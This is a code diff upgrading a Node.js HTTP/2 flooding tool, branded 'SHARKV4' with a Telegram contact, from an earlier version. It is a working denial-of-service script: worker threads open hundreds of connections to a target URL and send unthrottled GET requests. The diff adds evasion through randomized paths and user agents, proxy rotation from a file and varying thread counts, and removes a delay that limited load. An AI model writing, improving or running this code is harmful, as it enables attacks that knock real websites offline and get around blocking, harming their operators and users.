@@ -1,23 +1,48 @@
 const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
-const readline = require('readline');
+const fs = require('fs');
 const net = require('net');
+const readline = require('readline');
 
-const THREADS = 22;
-const POWER_MULTIPLIER = 2;
+let THREADS = getRandomInt(15, 35);
+const POWER_MULTIPLIER = 1;
 const MAX_INFLIGHT = 2000;
-const LIVE_REFRESH_RATE = 100;
+const REFRESH_RATE = 100;
 
 let totalRequests = 0;
 let successCount = 0;
 let errorCount = 0;
-let maxRps = 0;
 let rpsLastSecond = 0;
-let end;  // Define the `end` variable here for the main thread
+let maxRps = 0;
+let endTime = 0;
 
-// Helper function to get a random number within a range (inclusive)
-function getRandomInRange(min, max) {
+const signatures = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
+
+function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function randomSignature() {
+    return signatures[Math.floor(Math.random() * signatures.length)];
+}
+
+function generateUserAgent() {
+    const tag = randomSignature();
+    return `Mozilla/5.0 (${Math.random().toFixed(4)}; V4) ${tag}`;
+}
+
+function generateRandomPath() {
+    const tag = randomSignature().replace(/\s/g, '-');
+    const rand = Math.random().toString(36).substring(2, 12);
+    return `/${tag}/${rand}`;
+}
+
+function loadProxies() {
+    try {
+        return fs.readFileSync('proxies.txt', 'utf-8').split('\n').filter(Boolean);
+    } catch {
+        return [];
+    }
 }
 
 if (isMainThread) {
@@ -28,54 +53,49 @@ if (isMainThread) {
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
-
-    end = Date.now() + duration * 1000; // Define end time here in the main thread
+    endTime = Date.now() + duration * 1000;
+    const proxies = loadProxies();
 
     console.clear();
-    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
+    console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
+    console.log(`Initializing with ${THREADS} threads...`);
 
-    // Start the workers with dynamic connection numbers
-    for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
+    function startThreads() {
+        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+            new Worker(__filename, { workerData: { target, duration, proxies } });
+        }
     }
 
-    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
-    }
+    startThreads();
 
-    // Live Stats
+    setInterval(() => {
+        THREADS = getRandomInt(15, 35);
+    }, 20000);
+
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
         rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
+    }, REFRESH_RATE);
 
     function renderStats() {
+        const remaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-
-        // Remaining time calculation
-        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
-        const minutesRemaining = Math.floor(timeRemaining / 60);
-        const secondsRemaining = Math.floor(timeRemaining % 60);
-
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
+        console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
+        console.log(`==============================`);
         console.log(`total: ${totalRequests}`);
         console.log(`max-r: ${maxRps}`);
-        console.log(`===========================`);
+        console.log(`==============================`);
         console.log(`succes: ${successCount}`);
-        console.log(`Blocked: ${errorCount}`);
-        console.log(`===========================`);
-        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
+        console.log(`vape: ${errorCount}`);
+        console.log(`==============================`);
+        console.log(`REMAINING: ${remaining} SEC`);
     }
 
     const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
+        socket.on('data', chunk => {
+            const msg = chunk.toString();
             if (msg === 'req') totalRequests++, rpsLastSecond++;
             else if (msg === 'ok') successCount++;
             else if (msg === 'err') errorCount++;
@@ -84,19 +104,24 @@ if (isMainThread) {
     server.listen(9999);
 
 } else {
-    const { target, duration, initial, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;  // end time for worker threads
-
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
+    const { target, duration, proxies } = workerData;
+    const end = Date.now() + duration * 1000;
+    const statSocket = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => statSocket.write(msg);
 
     function sendLoop(client, inflight) {
-        if (Date.now() > endTime || client.destroyed) return;
+        if (Date.now() > end || client.destroyed) return;
 
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = client.request({ ':method': 'GET', ':path': '/' });
+                const headers = {
+                    ':method': 'GET',
+                    ':path': generateRandomPath(),
+                    'user-agent': generateUserAgent()
+                };
+
+                const req = client.request(headers);
 
                 req.on('response', () => {
                     inflight.count--;
@@ -116,36 +141,55 @@ if (isMainThread) {
             }
         }
 
-        // Slight delay to avoid killing the system
-        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
+        setTimeout(() => sendLoop(client, inflight), 0);
     }
 
-    function createConnection() {
-        if (Date.now() > endTime) return;
+    function createConnection(useProxy) {
+        if (Date.now() > end) return;
 
-        let client;
+        let proxy = useProxy && proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+
         try {
-            client = http2.connect(target);
+            let client;
+            if (proxy) {
+                const [host, port] = proxy.split(':');
+                const socket = require('net').connect(port, host, () => {
+                    const conn = http2.connect(target, { createConnection: () => socket });
+                    handleConnection(conn);
+                });
 
-            const inflight = { count: 0 };
+                socket.on('error', () => {
+                    socket.destroy();
+                    setTimeout(() => createConnection(false), 100); // fallback to raw
+                });
 
-            client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 5000); // auto-recover fast
-            });
+            } else {
+                client = http2.connect(target);
+                handleConnection(client);
+            }
 
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 5000));
+            function handleConnection(client) {
+                const inflight = { count: 0 };
 
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
-            });
+                client.on('error', () => {
+                    client.destroy();
+                    setTimeout(() => createConnection(useProxy), 500);
+                });
+
+                client.on('goaway', () => client.close());
+                client.on('close', () => setTimeout(() => createConnection(useProxy), 500));
+
+                client.on('connect', () => {
+                    for (let i = 0; i < 10; i++) sendLoop(client, inflight);
+                });
+            }
         } catch {
-            setTimeout(createConnection, 1000);
+            setTimeout(() => createConnection(false), 1000);
         }
     }
 
-    for (let i = 0; i < connections; i++) {
-        createConnection();
+    const launchCount = getRandomInt(500, 1000);
+    for (let i = 0; i < launchCount; i++) {
+        createConnection(true);
     }
 }
